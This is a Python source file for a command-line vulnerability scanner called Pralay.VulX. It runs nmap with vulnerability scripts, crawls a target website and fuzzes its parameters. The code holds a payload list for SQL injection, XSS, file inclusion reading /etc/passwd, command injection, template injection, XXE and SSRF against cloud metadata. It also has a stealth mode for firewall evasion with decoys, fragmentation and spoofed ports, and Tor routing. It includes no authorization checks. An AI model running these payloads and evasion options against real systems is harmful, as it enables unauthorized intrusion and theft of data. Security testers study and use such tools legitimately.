#!/usr/bin/env python3
"""
Pralay.VulX - Ultimate Vulnerability Scanner with Progress Indicator
Author: Vimal Bijalwan
Version: 2.1 (Progress Bar + Real-time Output)
"""

import sys
import json
import subprocess
import requests
import argparse
import time
import threading
from datetime import datetime
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

# ------------------------
# ASCII BANNER
# ------------------------
BANNER = r"""
╔══════════════════════════════════════════════════════════════════╗
║    ██████╗ ██████╗  █████╗ ██╗      █████╗ ██╗   ██╗             ║
║    ██╔══██╗██╔══██╗██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝             ║
║    ██████╔╝██████╔╝███████║██║     ███████║ ╚████╔╝              ║
║    ██╔═══╝ ██╔══██╗██╔══██║██║     ██╔══██║  ╚██╔╝               ║
║    ██║     ██║  ██║██║  ██║███████╗██║  ██║   ██║                ║
║    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝                ║
║              PRALAY.VULX - Vimal Bijalwan Ed.                   ║
║        "No Firewall Can Stop The Apocalypse"                     ║
╚══════════════════════════════════════════════════════════════════╝
"""

# ------------------------
# COMMON PARAMETER WORDLIST
# ------------------------
COMMON_PARAMS = [
    "id", "user", "username", "email", "pass", "password", "q", "search", "s", "page",
    "file", "doc", "folder", "path", "redirect", "url", "link", "goto", "return",
    "debug", "test", "admin", "lang", "cat", "category", "product", "pid", "uid",
    "aid", "bid", "cid", "did", "eid", "fid", "gid", "hid", "iid", "jid", "kid",
    "lid", "mid", "nid", "oid", "pid", "qid", "rid", "sid", "tid", "uid", "vid",
    "wid", "xid", "yid", "zid", "data", "json", "xml", "callback", "callback_func"
]

# ------------------------
# PAYLOADS
# ------------------------
PAYLOADS = {
    "SQLi": ["'", "\"", "1' OR '1'='1", "1 AND 1=1", "1 AND 1=2", "' OR '1'='1' --", "1' UNION SELECT NULL--"],
    "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>", "javascript:alert(1)"],
    "LFI": ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/etc/passwd", "../../../../../../etc/passwd"],
    "RCE": ["; ls", "| ls", "`ls`", "$(ls)", "; cat /etc/passwd", "| cat /etc/passwd"],
    "SSTI": ["{{7*7}}", "${7*7}", "{{7*'7'}}", "<% 7*7 %>", "${{7*7}}"],
    "XXE": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'],
    "SSRF": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080/admin", "http://localhost:22"]
}

# ------------------------
# NMAP WITH PROGRESS (REAL-TIME OUTPUT)
# ------------------------
def run_nmap_with_progress(target, ports, stealth=False, tor=False):
    cmd = ["nmap", "-sV", "--script", "vulners", "-v", "-p", ports, target]
    if stealth:
        cmd += ["-T1", "-f", "--data-length", "200", "-D", "RND:10", "--source-port", "53", "--max-retries", "1", "--host-timeout", "30s"]
        print("[*] Stealth mode active: scan may take several minutes")
    if tor:
        cmd = ["proxychains4", "-q"] + cmd
        print("[*] Tor mode active")
    
    print(f"[*] Running: {' '.join(cmd)}\n")
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    output_lines = []
    for line in process.stdout:
        print(line, end='')  # Show live output
        output_lines.append(line)
    process.wait()
    return ''.join(output_lines)

# ------------------------
# CRAWLER WITH PROGRESS
# ------------------------
def crawl_parameters(start_url, depth=1):
    print(f"[*] Crawling {start_url} (depth {depth})...")
    visited = set()
    params = set()
    to_visit = [(start_url, 0)]
    total_links = 0
    while to_visit:
        url, d = to_visit.pop(0)
        if url in visited or d > depth:
            continue
        visited.add(url)
        total_links += 1
        print(f"[*] Crawling: {url} (depth {d}) - found {len(params)} parameters so far", end='\r')
        try:
            resp = requests.get(url, timeout=5, verify=False)
            soup = BeautifulSoup(resp.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                full = urljoin(url, link['href'])
                if full.startswith(start_url) and full not in visited:
                    to_visit.append((full, d+1))
            for form in soup.find_all('form'):
                action = form.get('action')
                form_url = urljoin(url, action) if action else url
                method = form.get('method', 'get').lower()
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    name = input_tag.get('name')
                    if name:
                        params.add((form_url, method, name))
        except:
            continue
    print(f"\n[*] Crawling complete. Found {len(params)} parameters.")
    return list(params)

# ------------------------
# FUZZING WITH PROGRESS PERCENTAGE
# ------------------------
def fuzz_parameters_with_progress(param_list, delay=0.1):
    if not param_list:
        return []
    findings = []
    total_tests = len(param_list) * sum(len(payloads) for payloads in PAYLOADS.values())
    current_test = 0
    print(f"\n[*] Starting fuzzing: {len(param_list)} parameters, {sum(len(p) for p in PAYLOADS.values())} payloads each = {total_tests} total requests")
    for idx, (url, method, param) in enumerate(param_list, 1):
        for vuln_type, payloads in PAYLOADS.items():
            for payload in payloads:
                current_test += 1
                percent = (current_test / total_tests) * 100
                sys.stdout.write(f"\r[*] Progress: {percent:.1f}% | Param {idx}/{len(param_list)}: {param} | Testing {vuln_type}...")
                sys.stdout.flush()
                full_url = f"{url}?{param}={payload}"
                try:
                    resp = requests.get(full_url, timeout=3, verify=False)
                    if vuln_type == "SQLi" and ("mysql" in resp.text.lower() or "sql" in resp.text.lower() or "syntax" in resp.text.lower()):
                        findings.append(f"[!] {vuln_type} at {url} with {param}={payload}")
                    elif vuln_type == "XSS" and payload in resp.text:
                        findings.append(f"[!] {vuln_type} (reflected) at {url} with {param}={payload}")
                    elif vuln_type == "LFI" and ("root:" in resp.text or "[extensions]" in resp.text):
                        findings.append(f"[!] {vuln_type} at {url} with {param}={payload}")
                    elif vuln_type in ["RCE","SSTI","XXE","SSRF"] and ("uid=" in resp.text or "root" in resp.text):
                        findings.append(f"[!] Possible {vuln_type} at {url} with {param}={payload}")
                except:
                    pass
                time.sleep(delay)
    print("\n[*] Fuzzing complete.")
    return findings

# ------------------------
# REPORT GENERATION
# ------------------------
def generate_report(target, vulnerabilities, fuzz_findings, stealth_used, tor_used):
    report = f"""
{BANNER}
╔══════════════════════════════════════════════════════════╗
║                   SCAN REPORT (Vimal Bijalwan)           ║
║ Target : {target}                                           
║ Time   : {datetime.now()}                                 
║ Stealth: {stealth_used} | Tor: {tor_used}                       
╚══════════════════════════════════════════════════════════╝

"""
    if not vulnerabilities and not fuzz_findings:
        report += "[✓] No vulnerabilities found.\n"
    else:
        if vulnerabilities:
            report += "\n🔴 CVEs FOUND:\n" + "-"*50 + "\n"
            for v in vulnerabilities:
                report += f"""
[+] {v.get('service','Unknown')}
    CVE: {v.get('cve_id','N/A')} | CVSS: {v.get('cvss',0)} | Severity: {v.get('severity','N/A')}
"""
        if fuzz_findings:
            report += "\n🌐 WEB PARAMETER VULNS:\n" + "-"*50 + "\n" + "\n".join(fuzz_findings) + "\n"
    print(report)
    filename = f"PralayVulX_report_{target.replace('/', '_')}.txt"
    with open(filename, "w") as f:
        f.write(report)
    print(f"[*] Report saved as {filename}")

# ------------------------
# MAIN
# ------------------------
def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="Pralay.VulX - Vimal Bijalwan Edition")
    parser.add_argument("target", help="IP or hostname")
    parser.add_argument("--ports", default="1-1000", help="Port range")
    parser.add_argument("--crawl-url", help="Base URL for crawling + fuzzing")
    parser.add_argument("--stealth", action="store_true", help="Firewall evasion mode")
    parser.add_argument("--tor", action="store_true", help="Route scans through Tor")
    parser.add_argument("--no-nmap", action="store_true", help="Skip nmap scan")
    args = parser.parse_args()

    vulnerabilities = []
    fuzz_findings = []

    if not args.no_nmap:
        nmap_out = run_nmap_with_progress(args.target, args.ports, args.stealth, args.tor)
        # Parse vulners output (simple extraction)
        lines = nmap_out.splitlines()
        for line in lines:
            if "CVE-" in line and "vulners" in line:
                parts = line.split()
                if len(parts) >= 3:
                    cve = parts[1]
                    try:
                        score = float(parts[2])
                    except:
                        score = 0.0
                    sev = "CRITICAL" if score>=9 else "HIGH" if score>=7 else "MEDIUM" if score>=4 else "LOW"
                    vulnerabilities.append({"cve_id": cve, "cvss": score, "severity": sev, "service": "detected"})

    if args.crawl_url:
        params = crawl_parameters(args.crawl_url, depth=1)
        if not params:
            print("[*] No parameters found via crawling. Using common wordlist...")
            params = [(args.crawl_url, "get", p) for p in COMMON_PARAMS]
        fuzz_findings = fuzz_parameters_with_progress(params, delay=0.1)

    generate_report(args.target, vulnerabilities, fuzz_findings, args.stealth, args.tor)

if __name__ == "__main__":
    main()
